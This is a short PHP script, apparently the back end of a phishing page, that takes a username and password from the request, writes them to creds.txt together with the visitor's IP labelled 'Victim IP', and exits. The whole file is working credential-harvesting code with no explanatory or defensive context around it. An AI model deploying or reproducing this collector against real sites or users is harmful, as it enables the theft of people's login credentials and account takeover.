<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    fclose($file);
    exit();
}
?>
